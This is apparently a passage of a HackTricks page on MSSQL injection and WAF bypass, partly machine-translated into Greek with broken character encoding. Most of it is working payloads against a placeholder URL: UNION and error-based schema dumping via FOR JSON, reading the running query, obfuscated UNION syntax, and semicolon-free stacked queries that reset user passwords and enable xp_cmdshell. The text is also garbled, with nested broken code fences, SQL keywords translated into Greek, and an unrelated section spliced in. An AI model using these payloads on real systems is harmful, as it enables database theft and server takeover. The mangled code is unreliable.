### **Î“ÏÎ®Î³Î¿ÏÎ· Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·: Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· ÎŒÎ»Î¿Ï… Ï„Î¿Ï… Î ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… Î Î¯Î½Î±ÎºÎ± ÏƒÎµ ÎœÎ¹Î± Î•Î½Î¹Î±Î¯Î± Î•ÏÏÏ„Î·ÏƒÎ·**

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

ÎœÎ¹Î± ÏƒÏ…Î½Î¿Ï€Ï„Î¹ÎºÎ® Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® Ï„Î¿Ï… Ï€Î»Î®ÏÎ¿Ï…Ï‚ Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… ÎµÎ½ÏŒÏ‚ Ï€Î¯Î½Î±ÎºÎ± ÏƒÎµ Î¼Î¹Î± ÎµÎ½Î¹Î±Î¯Î± ÎµÏÏÏ„Î·ÏƒÎ· Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ ÏÎ®Ï„ÏÎ±Ï‚ `FOR JSON`. Î‘Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ ÏƒÏ…Î½Î¿Ï€Ï„Î¹ÎºÎ® Î±Ï€ÏŒ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ ÏÎ®Ï„ÏÎ±Ï‚ `FOR XML`, Î· Î¿Ï€Î¿Î¯Î± Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ "raw". Î— ÏÎ®Ï„ÏÎ± `FOR JSON` Ï€ÏÎ¿Ï„Î¹Î¼Î¬Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ ÏƒÏ…Î½Ï„Î¿Î¼Î¯Î± Ï„Î·Ï‚.

ÎŸÏÎ¯ÏƒÏ„Îµ Ï€ÏÏ‚ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÏƒÏ‡Î®Î¼Î±, Ï„Î¿Ï…Ï‚ Ï€Î¯Î½Î±ÎºÎµÏ‚ ÎºÎ±Î¹ Ï„Î¹Ï‚ ÏƒÏ„Î®Î»ÎµÏ‚ Î±Ï€ÏŒ Ï„Î· Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
```markdown
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```markdown
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 Ğ¸Ğ»Ğ¸ %C2%A0:

```
```markdown
# MSSQL Injection

Î— SQL Injection ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»ÎµÏ‚ SQL ÎµÎ½Ï„Î¿Î»Î­Ï‚ ÏƒÎµ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½. Î£Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï„Î¿Ï… MSSQL, Î¿Î¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½ Ï„Î¹Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚.

## Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±

ÎˆÎ½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± MSSQL Injection ÎµÎ¯Î½Î±Î¹ Ï„Î¿ ÎµÎ¾Î®Ï‚:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

Î‘Ï…Ï„Î® Î· ÎµÎ½Ï„Î¿Î»Î® Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´Ï…Î¬ÏƒÎµÎ¹ Ï„Î± Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î± Î±Ï€ÏŒ Î´ÏÎ¿ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î±, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… MSSQL.
```
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
```markdown
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
```

\N separator between SELECT and a throwaway column:

```
```markdown
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'Î±' SELECT 'Î²'
```

So for example, multiple queries such as:

```sql
```sql
Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ [tempdb]
Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Ï€Î¯Î½Î±ÎºÎ± [test] ([id] int)
ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ [test] Ï„Î¹Î¼Î­Ï‚(1)
ÎµÏ€Î¹Î»Î­Î¾Ï„Îµ [id] Î±Ï€ÏŒ [test]
Î´Î¹Î±Î³ÏÎ¬ÏˆÏ„Îµ Ï€Î¯Î½Î±ÎºÎ± [test]
```
```

Can be reduced to:

```sql
```markdown
Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ[tempdb]Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±/**/Ï€Î¯Î½Î±ÎºÎ±[test]([id]int)ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î®[test]Ï„Î¹Î¼Î­Ï‚(1)ÎµÏ€Î¹Î»Î¿Î³Î®[id]Î±Ï€ÏŒ[test]Î´Î¹Î±Î³ÏÎ±Ï†Î®/**/Ï€Î¯Î½Î±ÎºÎ±[test]
```
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· ÎµÎ½ÏŒÏ‚ Î¬Ï‡ÏÎ·ÏƒÏ„Î¿Ï… exec() ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ ÎºÎ±Î¹ ÎºÎ¬Î½Î¿Î½Ï„Î¬Ï‚ Ï„Î¿ WAF Î½Î± Î½Î¿Î¼Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î­Î³ÎºÏ…ÏÎ· ÎµÏÏÏ„Î·ÏƒÎ·
admina'union select 1,'admin','testtest123'exec('select 1')--
## Î‘Ï…Ï„ÏŒ Î¸Î± ÎµÎ¯Î½Î±Î¹:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï€ÎµÏÎ¯ÎµÏÎ³Î± ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î±ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏÏ‰Ï„Î®ÏƒÎµÎ¹Ï‚
admin'exec('update[users]set[password]=''a''')--
## Î‘Ï…Ï„ÏŒ Î¸Î± ÎµÎ¯Î½Î±Î¹:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Î‰ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Î‘Ï…Ï„ÏŒ Î¸Î± ÎµÎ¯Î½Î±Î¹
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
